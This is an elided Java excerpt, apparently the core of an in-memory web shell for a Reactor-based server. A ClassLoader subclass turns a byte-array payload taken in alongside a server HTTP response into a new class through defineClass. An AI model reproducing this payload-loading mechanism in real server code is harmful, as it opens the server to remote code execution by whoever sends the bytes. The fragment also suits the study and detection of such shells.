...
public class ReactorAdaptor extends ClassLoader {
    ...
    public ReactorAdaptor() {
    }

    public ReactorAdaptor(ClassLoader parent) {
        super(parent);
    }
    ...
    private DataBuffer executeCore(byte[] payload, ServerHttpResponse response) throws Exception {
        if (coreClass == null) {
            ...
            coreClass = new ReactorAdaptor(Thread.currentThread().getContextClassLoader()).defineClass(bytes, 0, bytes.length);
        }
